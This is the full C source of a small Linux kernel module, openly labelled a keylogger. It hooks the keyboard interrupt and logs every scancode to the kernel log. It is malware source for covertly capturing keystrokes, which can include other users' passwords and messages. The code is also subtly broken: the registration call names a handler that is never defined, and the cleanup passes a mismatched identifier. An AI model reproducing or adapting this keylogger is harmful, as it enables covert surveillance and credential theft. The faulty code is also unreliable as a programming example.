#include <linux/init.h>
#include <linux/module.h>
#include <linux/io.h>
#include <linux/interrupt.h>

/* Intel i8042 keyboard controller I/O ports */
#define KEYBOARD_IRQ 1
#define KBD_STATUS_REG 0x64
#define KBD_CNTL_REG   0x64
#define KBD_DATA_REG   0x60

#define kbd_read_input()     inb(KBD_DATA_REG)
#define kbd_read_status()    inb(KBD_STATUS_REG)
#define kbd_write_output(v)  outb(v, KBD_DATA_REG)
#define kbd_write_command(v) outb(v, KBD_CNTL_REG)

/* Interrupt handler */
static irqreturn_t keyboard_irq_handler(int irq, void *dev_id) {
    unsigned char scancode = kbd_read_input();
    unsigned char status = kbd_read_status();
    printk(KERN_INFO "Scancode: 0x%02x, Status: 0x%02x\n", scancode, status);
    return IRQ_HANDLED;
}

/* Module initialization */
static int __init custom_init(void) {
    int result = request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler,
                             IRQF_SHARED, "my_keyboard", (void *)(my_keyboard_irq_handler));
    if (result) {
        printk(KERN_ERR "Failed to register keyboard IRQ handler\n");
        return result;
    }

    printk(KERN_INFO "Keylogger module loaded\n");
    return 0;
}

/* Module cleanup */
static void __exit custom_exit(void) {
    free_irq(KEYBOARD_IRQ, (void *)(keyboard_irq_handler));
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(custom_init);
module_exit(custom_exit);

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_DESCRIPTION("A keylogger");
MODULE_LICENSE("GPL");
